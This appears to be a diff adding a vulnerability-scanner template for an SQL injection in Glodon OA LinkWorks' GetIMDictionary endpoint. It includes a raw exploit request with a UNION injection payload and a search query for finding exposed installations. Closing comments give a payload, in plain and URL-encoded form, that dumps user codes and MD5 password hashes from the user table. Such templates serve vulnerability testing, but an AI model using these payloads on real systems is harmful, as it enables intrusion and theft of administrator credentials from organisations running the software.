@@ -1,0 +1,38 @@
+id: glodon-linkworks-getimdictionary-sqli
+
+info:
+  name: 广联达OA linkworks GetIMDictionary sql注入
+  author: wms,pphua
+  severity: high
+  description: 广联达OA linkworks GetIMDictionary sql注入
+  tags: glodon,sqli,oa,linkworks
+  metadata:
+   verified: true
+   hunter-query: web.body="/Services/Identification/"
+
+http:
+  - raw:
+      - |
+        POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Content-Length: 227
+
+        key=1' UNION ALL SELECT '{{randstr}}' -- z
+        
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - 'value="([^"]*)"'
+
+    matchers:
+      - type: dsl
+        dsl:
+         - "status_code == 200 && contains_all(body,'value=','{{randstr}}')"
+
+# 查询管理员密码 原始payload: key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER -- z
+# 查询管理员密码 url编码 paylaod: key=1%27%20%55%4e%49%4f%4e%20%41%4c%4c%20%53%45%4c%45%43%54%20%74%6f%70%20%31%20%63%6f%6e%63%61%74%28%46%5f%43%4f%44%45%2c%27%3a%27%2c%46%5f%50%57%44%5f%4d%44%35%29%20%66%72%6f%6d%20%54%5f%4f%52%47%5f%55%53%45%52%20%2d%2d%20%7a
